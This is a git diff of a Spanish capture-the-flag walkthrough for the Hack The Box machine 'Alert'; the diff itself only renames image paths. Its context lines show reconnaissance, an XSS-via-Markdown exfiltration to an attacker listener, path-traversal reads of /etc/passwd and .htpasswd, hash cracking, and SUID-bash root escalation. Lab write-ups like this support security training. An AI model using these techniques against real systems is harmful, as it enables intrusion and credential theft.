@@ -2,7 +2,7 @@
 
 ---
 
-![Logo](assets/alert/00_logo_alert.png)
+![Logo](images/00_logo_alert.png)
 
 ###### Técnicas demostradas:
 
@@ -20,7 +20,7 @@ En primer lugar realizamos un escaneo de puertos para recopilar cuáles están a
 nmap -p- open -sS --min-rate 5000 -vvv -Pn 10.10.11.44 -oG allPorts
 ```
 
-![Escaneo de puertos abiertos](assets/alert/01_nmap1_alert.png)
+![Escaneo de puertos abiertos](images/01_nmap1_alert.png)
 
 Con la herramienta `ExtractPorts` definida en nuestro sistema copiamos los puertos abiertos a la clipboard
 
@@ -28,7 +28,7 @@ Con la herramienta `ExtractPorts` definida en nuestro sistema copiamos los puert
 extractPorts allports
 ```
 
-![Extracción de puertos](assets/alert/02_extraccion_alert.png)
+![Extracción de puertos](images/02_extraccion_alert.png)
 
 Realizamos un escaneo más exhaustivo de los puertos para conocer el servicio y la versión que está corriendo en ellos.
 
@@ -36,23 +36,23 @@ Realizamos un escaneo más exhaustivo de los puertos para conocer el servicio y 
 nmap -p22,80 -sCV 10.10.11.44 -oN targeted
 ```
 
-![Escaneo de servicios y versiones](assets/alert/03_nmap2_alert.png)
+![Escaneo de servicios y versiones](images/03_nmap2_alert.png)
 
 Con la herramienta `WhatWeb` terminamos de recopilar información que nos pueda ser de ayuda.
 
-![Whatweb](assets/alert/04_whatweb_alert.png)
+![Whatweb](images/04_whatweb_alert.png)
 
 Una vez añadido el dominio a nuestro archivo `/etc/hosts` realizamos una inspección de la web para ver a qué nos enfrentamos.
 
-![Primer vistazo a la web](assets/alert/05_web1_alert.png)
+![Primer vistazo a la web](images/05_web1_alert.png)
 
 Probamos realizar un ataque de inyección LaTeX pero no tenemos éxito.
 
-![Inyección LaTeX](assets/alert/06_LaTeX_alert.png)
+![Inyección LaTeX](images/06_LaTeX_alert.png)
 
 Si revisamos el apartado "About Us" vemos que nos indican que el administrador del sitio revisa los mensajes del apartado "Contact" esto es importante.
 
-![Sección About Us](assets/alert/07_aboutus_alert.png)
+![Sección About Us](images/07_aboutus_alert.png)
 
 Vamos a realizar un descubrimiento de directorios con la herramienta `gobuster` en busca de archivos con extensión `.php`
 
@@ -60,11 +60,11 @@ Vamos a realizar un descubrimiento de directorios con la herramienta `gobuster` 
 gobuster dir -u http://alert.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php
 ```
 
-![Listando directorios con Gobuster](assets/alert/08_gobuster1_alert.png)
+![Listando directorios con Gobuster](images/08_gobuster1_alert.png)
 
 Revisamos que tenemos en `/messages.php`
 
-![Vistazo a messages.php](assets/alert/09_messagesphp1_alert.png)
+![Vistazo a messages.php](images/09_messagesphp1_alert.png)
 
 Tras no ver nada, vamos a realizar un escaneo de subdominios con `wffuz`
 
@@ -72,15 +72,15 @@ Tras no ver nada, vamos a realizar un escaneo de subdominios con `wffuz`
 wfuzz -c --hc 301 -t 20 /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.alert.htb" alert.htb
 ```
 
-![Listando subdominios con Wfuzz](assets/alert/10_wfuzz1_alert.png)
+![Listando subdominios con Wfuzz](images/10_wfuzz1_alert.png)
 
 Encontramos un subdominio `statistics.alert.htb` lo añadimos a nuestro archivo `/etc/hosts`
 
-![Fichero hosts](assets/alert/11_etchosts_alert.png)
+![Fichero hosts](images/11_etchosts_alert.png)
 
 Tras revisarlo vemos que tenemos un panel de autenticación.
 
-![Panel de autenticación](assets/alert/12_autenticaion_alert.png)
+![Panel de autenticación](images/12_autenticaion_alert.png)
 
 En este punto vamos a revisar si la web es vulnerable a un ataque XSS para markdown, con ayuda de la web [XSS in Markdown - HackTricks](https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/xss-in-markdown.html) preparamos nuestro payload.
 
@@ -94,7 +94,7 @@ En este punto vamos a revisar si la web es vulnerable a un ataque XSS para markd
 
 Una vez subido el archivo al panel, vemos que sí.
 
-![Resultado de prueba XSS](assets/alert/13_XSS1_alert.png)
+![Resultado de prueba XSS](images/13_XSS1_alert.png)
 
 Sabiendo esto, vamos a adaptar nuestro payload para que la web cargue un recurso en nuestra máquina que vamos a llamar `pwned.js` Esto lo haremos cargando en el archivo markdown una llamada al fichero, como sabemos que el administrador está revisando los mensajes que le enviamos a través del panel de "Contact Us" cargaremos el enlace que nos proporciona el visualizador de la web para pasárselo al administrador, por detrás estaremos a la escucha en nuestra máquina para recoger la petición.
 
@@ -106,9 +106,9 @@ Sabiendo esto, vamos a adaptar nuestro payload para que la web cargue un recurso
 nc -nlvp 3000
 ```
 
-![Petición del servidor](assets/alert/14_respuesta_alert.png)
+![Petición del servidor](images/14_respuesta_alert.png)
 
-![Respuesta de visualizer.php](assets/alert/15_respuesta1_alert.png)
+![Respuesta de visualizer.php](images/15_respuesta1_alert.png)
 
 Esta es la URL que nos devuelve el visualizador de la web. Vamos a pasársela por mensaje al administrador del sitio.
 
@@ -116,7 +116,7 @@ Esta es la URL que nos devuelve el visualizador de la web. Vamos a pasársela po
 http://alert.htb/visualizer.php?link_share=680f57d0974c63.17343056.md
 ```
 
-![Mensaje al admin a través de Contact Us](assets/alert/16_contactus_alert.png)
+![Mensaje al admin a través de Contact Us](images/16_contactus_alert.png)
 
 A su vez vamos a ponernos a la escucha en nuestra máquina para recoger la petición.
 
@@ -141,17 +141,17 @@ req2.send();
 
 Una vez tenemos la respuesta debemos descifrarla en `base64`
 
-![Respuesta de contenido](assets/alert/17_messagesphp_content_alert.png)
+![Respuesta de contenido](images/17_messagesphp_content_alert.png)
 
 ```bash
 echo "[...]" | base64 -d
 ```
 
-![Decodificación del contenido](assets/alert/18_contentmessagesphp_alert.png)
+![Decodificación del contenido](images/18_contentmessagesphp_alert.png)
 
 Tras acceder no vemos nada.
 
-![Comprobando en navegador](assets/alert/19_accesofichero_alert.png)
+![Comprobando en navegador](images/19_accesofichero_alert.png)
 
 En este punto y sabiendo que este método funciona, vamos a tratar de modificar nuestro payload para realizar un `LFI` y leer el fichero `/etc/passwd`
 
@@ -176,7 +176,7 @@ req2.send();
 python3 -m http.server 3000
 ```
 
-![LFI Path Traversal /etc/passwd](assets/alert/20_passwd_alert.png)
+![LFI Path Traversal /etc/passwd](images/20_passwd_alert.png)
 
 ```bash
 echo "[...]" | base64 -d
@@ -184,7 +184,7 @@ echo "[...]" | base64 -d
 
 Tras decodificar la respuesta vemos que tenemos dos usuarios.
 
-![Fichero /etc/passwd](assets/alert/21_decodepasswd_alert.png)
+![Fichero /etc/passwd](images/21_decodepasswd_alert.png)
 
 Anteriormente, descubrimos `statistics.alert.htb` , que solicita autenticación. Intentaremos leer el archivo de configuración de `Apache`.
 
@@ -209,7 +209,7 @@ req2.send();
 python3 -m http.server 3000
 ```
 
-![Respuesta con la config de Apache](assets/alert/22_apacheconf_alert.png)
+![Respuesta con la config de Apache](images/22_apacheconf_alert.png)
 
 ```bash
 echo "PHByZT48VmlydHVhbEhvc3QgKjo4MD4KICAgIFNlcnZlck5hbWUgYWxlcnQuaHRiCgogICAgRG9jdW1lbnRSb290IC92YXIvd3d3L2FsZXJ0Lmh0YgoKICAgIDxEaXJlY3RvcnkgL3Zhci93d3cvYWxlcnQuaHRiPgogICAgICAgIE9wdGlvbnMgRm9sbG93U3ltTGlua3MgTXVsdGlWaWV3cwogICAgICAgIEFsbG93T3ZlcnJpZGUgQWxsCiAgICA8L0RpcmVjdG9yeT4KCiAgICBSZXdyaXRlRW5naW5lIE9uCiAgICBSZXdyaXRlQ29uZCAle0hUVFBfSE9TVH0gIV5hbGVydFwuaHRiJAogICAgUmV3cml0ZUNvbmQgJXtIVFRQX0hPU1R9ICFeJAogICAgUmV3cml0ZVJ1bGUgXi8/KC4qKSQgaHR0cDovL2FsZXJ0Lmh0Yi8kMSBbUj0zMDEsTF0KCiAgICBFcnJvckxvZyAke0FQQUNIRV9MT0dfRElSfS9lcnJvci5sb2cKICAgIEN1c3RvbUxvZyAke0FQQUNIRV9MT0dfRElSfS9hY2Nlc3MubG9nIGNvbWJpbmVkCjwvVmlydHVhbEhvc3Q+Cgo8VmlydHVhbEhvc3QgKjo4MD4KICAgIFNlcnZlck5hbWUgc3RhdGlzdGljcy5hbGVydC5odGIKCiAgICBEb2N1bWVudFJvb3QgL3Zhci93d3cvc3RhdGlzdGljcy5hbGVydC5odGIKCiAgICA8RGlyZWN0b3J5IC92YXIvd3d3L3N0YXRpc3RpY3MuYWxlcnQuaHRiPgogICAgICAgIE9wdGlvbnMgRm9sbG93U3ltTGlua3MgTXVsdGlWaWV3cwogICAgICAgIEFsbG93T3ZlcnJpZGUgQWxsCiAgICA8L0RpcmVjdG9yeT4KCiAgICA8RGlyZWN0b3J5IC92YXIvd3d3L3N0YXRpc3RpY3MuYWxlcnQuaHRiPgogICAgICAgIE9wdGlvbnMgSW5kZXhlcyBGb2xsb3dTeW1MaW5rcyBNdWx0aVZpZXdzCiAgICAgICAgQWxsb3dPdmVycmlkZSBBbGwKICAgICAgICBBdXRoVHlwZSBCYXNpYwogICAgICAgIEF1dGhOYW1lICJSZXN0cmljdGVkIEFyZWEiCiAgICAgICAgQXV0aFVzZXJGaWxlIC92YXIvd3d3L3N0YXRpc3RpY3MuYWxlcnQuaHRiLy5odHBhc3N3ZAogICAgICAgIFJlcXVpcmUgdmFsaWQtdXNlcgogICAgPC9EaXJlY3Rvcnk+CgogICAgRXJyb3JMb2cgJHtBUEFDSEVfTE9HX0RJUn0vZXJyb3IubG9nCiAgICBDdXN0b21Mb2cgJHtBUEFDSEVfTE9HX0RJUn0vYWNjZXNzLmxvZyBjb21iaW5lZAo8L1ZpcnR1YWxIb3N0PgoKPC9wcmU+Cg==" | base64 -d
@@ -217,7 +217,7 @@ echo "PHByZT48VmlydHVhbEhvc3QgKjo4MD4KICAgIFNlcnZlck5hbWUgYWxlcnQuaHRiCgogICAgRG
 
 Realizamos la decodificación. Y observamos que disponemos del fichero `.htpasswd`
 
-![Decode apache config](assets/alert/23_decode_htpasswd_alert.png)
+![Decode apache config](images/23_decode_htpasswd_alert.png)
 
 Modificaremos nuestro payload para tratar de leerlo.
 
@@ -242,7 +242,7 @@ req2.send();
 python3 -m http.server 3000
 ```
 
-![Respuesta con contenido de .htpasswd](assets/alert/24_htpasswd_alert.png)
+![Respuesta con contenido de .htpasswd](images/24_htpasswd_alert.png)
 
 Tras decodificarlo obtenemos un hash.
 
@@ -250,7 +250,7 @@ Tras decodificarlo obtenemos un hash.
 echo "[...]" | base64 -d
 ```
 
-![Hash de usuario](assets/alert/25_hashuser_alert.png)
+![Hash de usuario](images/25_hashuser_alert.png)
 
 `$apr1$` revela que el hash utilizado es MD5, el cual crackearemos utilizando `Hashcat`. Guadamos el hash obtenido en un fichero `data`.
 
@@ -258,11 +258,11 @@ echo "[...]" | base64 -d
 hashcat -a 0 -m 1600 data /usr/share/wordlists/rockyou.txt
 ```
 
-![Hascat](assets/alert/26_hashcat_crack_alert.png)
+![Hascat](images/26_hashcat_crack_alert.png)
 
 Después de realizar el proceso obtenemos la contraseña del usuario. Probamos a ingresar en el panel que encontramos anteriormente. Observamos un dashboard, pero por el momento no podemos hacer nada más aquí.
 
-![Acceso a panel](assets/alert/27_accesopanel_alert.png)
+![Acceso a panel](images/27_accesopanel_alert.png)
 
 En este punto vamos a probar el acceso vía `ssh` con las credenciales que tenemos.
 
@@ -270,11 +270,11 @@ En este punto vamos a probar el acceso vía `ssh` con las credenciales que tenem
 ssh usuario@10.10.11.44
 ```
 
-![Acceso SSH](assets/alert/28_sshaccess_alert.png)
+![Acceso SSH](images/28_sshaccess_alert.png)
 
 Encontramos la primera flag en el directorio personal del usuario.
 
-![Flag user.txt](assets/alert/29_userflag_alert.png)
+![Flag user.txt](images/29_userflag_alert.png)
 
 #### Escalada de privilegios
 
@@ -284,7 +284,7 @@ En primer lugar vamos a revisar los servicios que están corriendo.
 netstat -tulnp
 ```
 
-![Netstat](assets/alert/30_netstat_alert.png)
+![Netstat](images/30_netstat_alert.png)
 
 Nos conectamos de nuevo a la máquina haciendo un `port-forwarding` del puerto 8080
 
@@ -302,13 +302,13 @@ python3 -m http.server 4000
 wget http://10.10.14.9:4000/pspy64
 ```
 
-![Descargando PsPy](assets/alert/31_movepspy_alert.png)
+![Descargando PsPy](images/31_movepspy_alert.png)
 
 Cambiamos los permisos para poder ejecutarlo.
 
 Observamos que se está ejecutando `monitor.php` con el `UID=0`
 
-![Revisando procesos con PsPy](assets/alert/32_monitorphp_alert.png)
+![Revisando procesos con PsPy](images/32_monitorphp_alert.png)
 
 Vamos a revisar su contenido.
 
@@ -318,14 +318,14 @@ cat /opt/website-monitor/monitor.php
 
 Observamos que el fichero hace una llamada a otro `configuration.php` este puede ser interesante, vamos a revisarlo.
 
-![monitor.php](assets/alert/33_configurationphp_alert.png)
+![monitor.php](images/33_configurationphp_alert.png)
 
 ```bash
 cd /opt/website-monitor/
 ls -la
 ```
 
-![monitor.php](assets/alert/34_websitemonitor_content_alert.png)
+![monitor.php](images/34_websitemonitor_content_alert.png)
 
 ```bash
 cd /config
@@ -334,13 +334,13 @@ ls -la
 
 Observamos que el fichero pertenece al grupo `management` por lo que podemos modificarlo para añadir `SUID` a la `bash`
 
-![Revisando permisos](assets/alert/35_permconfigurationphp_alert.png)
+![Revisando permisos](images/35_permconfigurationphp_alert.png)
 
 ```bash
 nano configuration.php
 ```
 
-![Asignando SUID a bash](assets/alert/36_SUIDbash_alert.png)
+![Asignando SUID a bash](images/36_SUIDbash_alert.png)
 
 Una vez hecho podremos escalar a `root`
 
@@ -348,6 +348,6 @@ Una vez hecho podremos escalar a `root`
 /bin/bash -p
 ```
 
-![Consiguiendo acceso a root](assets/alert/37_priviledgeescalation_alert.png)
+![Consiguiendo acceso a root](images/37_priviledgeescalation_alert.png)
 
-![Flag root.txt](assets/alert/38_root_flag_alert.png)
+![Flag root.txt](images/38_root_flag_alert.png)
